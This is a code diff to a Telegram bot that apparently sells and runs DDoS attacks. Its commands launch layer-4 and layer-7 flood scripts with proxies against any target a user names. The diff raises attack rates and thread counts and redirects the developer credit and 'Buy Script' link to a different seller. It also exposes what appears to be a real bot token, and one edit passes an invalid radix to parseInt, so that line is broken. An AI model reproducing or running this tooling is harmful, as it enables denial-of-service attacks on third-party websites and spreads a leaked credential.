@@ -9,7 +9,7 @@ const token = '7236746522:AAHwzWIRB7V8dRHlG-FWTpPwmr1h968sPYk';
 const bot = new TelegramBot(token, {polling: true});
 const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
 const adminIds = adminData.admins;
-const timeLimit = parseInt(adminData.limit, 10);
+const timeLimit = parseInt(adminData.limit, 10000);
 
 console.log(figlet.textSync('SkyranXDDoS', {
     font: 'Standard',
@@ -94,8 +94,8 @@ const name = msg.from.first_name;
   bot.sendMessage(msg.chat.id, 
 `Hallo ${name}, Selamat Datang Di Bot DDoS Zamss-XcV
   
-── 𖥔 Nama Bot : ZamsS-AttacK 𖥔── 
-── 𖥔 Developer : @UserMakLu 𖥔── 
+── 𖥔 Nama Bot : Attack 𖥔── 
+── 𖥔 Developer : @quangnqtoolcode 𖥔── 
 ── 𖥔 Version : 5.1𖥔── 
   
 ── 𖥔DDOS PRIVATE METHODS𖥔── 
@@ -157,7 +157,7 @@ bot.onText(/^\/AttackL7(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node AttackL7.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node AttackL7.js ${target} ${time} 305 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -192,7 +192,7 @@ bot.onText(/^\/Zamss-XcV(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Zamss-XcV.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node Zamss-XcV.js ${target} ${time} 350 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -227,12 +227,12 @@ bot.onText(/^\/zamss(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node zamss.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node zamss.js ${target} ${time} 305 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
   processes[chatId].push(process);
-  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: zamss\nStatus: Owner`, {
+  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 100\nPort: 443\nConcurents: 1\nMethods: zamss\nStatus: Owner`, {
     reply_markup: {
       inline_keyboard: [
         [{ text: 'Stop', callback_data: 'stop' }]
@@ -297,7 +297,7 @@ bot.onText(/^\/Tls(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Tls.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node Tls.js ${target} ${time} 35 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -332,7 +332,7 @@ bot.onText(/^\/AttackL4(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node AttackL4.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node AttackL4.js ${target} ${time} 35 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -367,7 +367,7 @@ bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node bypass.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node bypass.js ${target} ${time} 35 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -437,7 +437,7 @@ bot.onText(/^\/Kontol(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node Kontol.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node Kontol.js ${target} ${time} 35 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -472,7 +472,7 @@ bot.onText(/^\/FLOOD(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node FLOOD.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node FLOOD.js ${target} ${time} 350 100 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -507,7 +507,7 @@ bot.onText(/^\/Kill(?: (.+) (.+))?$/, (msg, match) => {
     bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
     return;
   }
-  const process = exec(`node StarsXKill.js ${target} ${time} 35 10 proxy.txt`);
+  const process = exec(`node StarsXKill.js ${target} ${time} 300 1000 proxy.txt`);
   if (!processes[chatId]) {
     processes[chatId] = [];
   }
@@ -584,7 +584,7 @@ bot.onText(/^\/info (.+)/, (msg, match) => {
      target: web,
      apikey: 'NOKEY'
  };
- axios.post('https://check-host.cc/rest/V2/info', data, {
+ axios.post('https://check-host.net/check-http?host=', data, {
     headers: {
       'accept': 'application/json',
       'Content-Type': 'application/json'
@@ -609,7 +609,7 @@ Latitude: ${result.latitude}
 Longitude: ${result.longitude}
 \`\`\`
 *About ASN:* \`${result.asnlink}\`
-*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
+*Website:* \`https://check-host.net/check-http?host=${web}\`
          `;
          bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
      } else {
@@ -629,7 +629,7 @@ bot.onText(/\/script/, (msg) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'Buy Script', url: `https://t.me/UserMakLu` }
+            { text: 'Buy Script', url: `https://t.me/quangnqtoolcode` }
           ]
         ]
       },
